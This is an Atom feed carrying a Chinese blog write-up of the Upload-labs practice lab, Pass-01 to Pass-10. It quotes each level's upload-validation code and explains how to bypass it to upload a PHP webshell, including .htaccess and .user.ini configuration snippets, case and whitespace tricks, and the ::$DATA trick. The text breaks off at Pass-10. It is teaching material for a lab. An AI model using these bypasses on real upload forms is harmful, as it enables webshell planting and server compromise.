<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>forg12_blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-12-22T07:28:01.907Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>forg12</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Upload-labs Pass01-11</title>
    <link href="http://example.com/2021/12/22/Upload-labs%20Pass01-11/"/>
    <id>http://example.com/2021/12/22/Upload-labs%20Pass01-11/</id>
    <published>2021-12-22T05:45:52.000Z</published>
    <updated>2021-12-22T07:28:01.907Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-Pass-01-前端验证之JS绕过"><a href="#1-Pass-01-前端验证之JS绕过" class="headerlink" title="1.Pass-01 前端验证之JS绕过"></a>1.Pass-01 前端验证之JS绕过</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码中验证方式是：前端JS验证<br>允许上传的类型为：<code>.jpg|.png|.gif</code>，所以将本地 webshell.php 文件改为 webshell.jpg ，然后通过 burp再将 webshell.jpg改回 webshell.php<br><img src="https://files.catbox.moe/78cj8s.png" alt="image.png"><br><img src="https://files.catbox.moe/aqgu7s.png" alt="image.png"></p><h1 id="2-Pass-02-MIME绕过"><a href="#2-Pass-02-MIME绕过" class="headerlink" title="2.Pass-02 MIME绕过"></a>2.Pass-02 MIME绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || </span><br><span class="line">    (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || </span><br><span class="line">    (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>))</span><br><span class="line">  <span class="comment">//文件类型必须是image/jpeg,image/png或者image/gif中的一种才能执行上传操作</span></span><br></pre></td></tr></table></figure><p>源码中验证方式是：上传文件的type值<br>通过burp抓包，将文件的type值改为image/jpeg<br><img src="https://files.catbox.moe/i1q6y6.png" alt="image.png"><br><img src="https://files.catbox.moe/ljeh2n.png" alt="image.png"></p><h1 id="3-Pass-03-上传特殊可解析后缀"><a href="#3-Pass-03-上传特殊可解析后缀" class="headerlink" title="3.Pass-03 上传特殊可解析后缀"></a>3.Pass-03 上传特殊可解析后缀</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br></pre></td></tr></table></figure><p>源码中验证方式是：<br>获取文件名<br>移除字符串两侧的空白字符<br>删除文件名末尾的点<br>返回从”<code>.</code>“该位置到字符串结尾的所有字符<br>将后缀转换为小写<br>去除后缀中的字符串：<code>::$DATA</code><br>最后再进行首尾去空<br>然后对比后缀是否不在<code>deny_ext</code>中<br>​</p><p>上传其他可解析的后缀名进行绕过，将wehshell.php后缀名改为php5<br>​</p><h1 id="4-Pass-04-上传-htaccess解析"><a href="#4-Pass-04-上传-htaccess解析" class="headerlink" title="4.Pass-04 上传.htaccess解析"></a>4.Pass-04 上传.htaccess解析</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">       <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">       <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">       <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">       <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">       <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">       <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br></pre></td></tr></table></figure><p>源码中验证方式是：<br>获取文件名<br>移除字符串两侧的空白字符<br>删除文件名末尾的点<br>返回从”<code>.</code>“该位置到字符串结尾的所有字符<br>将后缀转换为小写<br>去除后缀中的字符串：<code>::$DATA</code><br>最后再进行首尾去空<br>然后对比后缀是否不在<code>deny_ext</code>中</p><p>由于此处的<code>deny_ext</code>数组太大，此处上传<code>.htaccess</code>文件，通过在此文件中加入php自定义解析规则，然后在上传自定义解析规则的文件。<br>ps：<code>.htaccess</code>只是适用于apache，如果变成niginx或者iis则不会被解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;aaa&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>上传成功后，以aaa为名的文件会被解析为php文件执行</p><h1 id="5-Pass-05-后缀大小写绕过"><a href="#5-Pass-05-后缀大小写绕过" class="headerlink" title="5.Pass-05 后缀大小写绕过"></a>5.Pass-05 后缀大小写绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.user.ini文件预备知识：</span><br><span class="line"></span><br><span class="line">使用条件：</span><br><span class="line">(1)服务器脚本语言为PHP</span><br><span class="line">(2)对应目录下面有可执行的php文件</span><br><span class="line">(3)服务器使用CGI／FastCGI模式</span><br><span class="line">.user.ini.它比.htaccess用的更广，不管是nginx/apache/IIS，</span><br><span class="line">只要是以fastcgi运行的php都可以用这个方法。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此处的黑名单相比下关来说少了<code>.user.ini</code>，于是上传<code>.user.ini</code>文件然后在文件中输入：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto<span class="emphasis">_prepend_</span>file=webshell.jpg</span><br></pre></td></tr></table></figure><p>.user.ini文件里的意思是：<br>所有的php文件都自动包含webshell.jpg文件。.user.ini相当于一个用户自定义的php.ini<br>然后上传包含一句话的webshell.jpg，之后访问readme.php完成本关。</p><h1 id="6-Pass-06-后缀大小写绕过"><a href="#6-Pass-06-后缀大小写绕过" class="headerlink" title="6.Pass-06 后缀大小写绕过"></a>6.Pass-06 后缀大小写绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空</span></span><br></pre></td></tr></table></figure><p>此处相比之前代码中少了后缀转化为小写，此处虽然有一些大写后缀的黑名单，但是不全，所以此处可用后缀大小写绕过。<br>​</p><p>将webshell.php文件后缀改为PHp后上传完成本关。<br>​</p><h1 id="7-Pass-07-空格绕过"><a href="#7-Pass-07-空格绕过" class="headerlink" title="7.Pass-07 空格绕过"></a>7.Pass-07 空格绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>相比完整的验证代码，此处少了首尾去空的代码。<br>​</p><p>通过burp抓包，在文件后缀后门加上空格，完成本次的绕过。<br><img src="https://files.catbox.moe/b38npm.png" alt="image.png"></p><h1 id="8-Pass-08-点绕过"><a href="#8-Pass-08-点绕过" class="headerlink" title="8.Pass-08 点绕过"></a>8.Pass-08 点绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空</span></span><br></pre></td></tr></table></figure><p>相比完整的验证代码，此处少了删除文件名末尾的点的代码。<br>​</p><p>通过burp抓包后在文件后缀后门加上.然后放出数据包完成上传，访问文件为<code>webshell.php.</code><br><img src="https://files.catbox.moe/pnj2oe.png" alt="image.png"></p><h1 id="9-Pass-09-特殊字符-DATA绕过"><a href="#9-Pass-09-特殊字符-DATA绕过" class="headerlink" title="9.Pass-09 特殊字符::$DATA绕过"></a>9.Pass-09 特殊字符::$DATA绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = trim($file_ext); //首尾去空</span></span><br></pre></td></tr></table></figure><p>相比完整的验证代码，少了删除文件后缀中的字符串<code>::$DATA</code><br>补充知识：<br>php在window的时候如果文件名+<code>::$DATA</code> 会把<code>::$DATA </code>之后的数据当成文件流处理，不会检测后缀名，且保持<code>::$DATA</code> 之前的文件名。<br>​</p><p>通过burp抓包后在文件后缀后面加上<code>::$DATA</code>，然后放出数据包完成上传，访问文件的地址为<code>webshell.php</code><br><img src="https://files.catbox.moe/uiuoqu.png" alt="image.png"></p><h1 id="10-Pass-10-deldot-函数绕过"><a href="#10-Pass-10-deldot-函数绕过" class="headerlink" title="10.Pass-10 